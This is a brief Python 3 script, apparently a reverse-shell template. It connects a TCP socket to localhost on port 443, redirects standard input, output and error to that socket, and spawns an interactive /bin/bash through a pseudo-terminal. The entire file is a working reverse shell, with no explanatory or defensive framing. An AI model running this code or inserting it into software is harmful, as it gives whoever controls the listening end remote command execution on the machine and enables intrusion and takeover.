#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from pty import spawn
from socket import socket, AF_INET, SOCK_STREAM
import os

s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 443))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
spawn("/bin/bash")
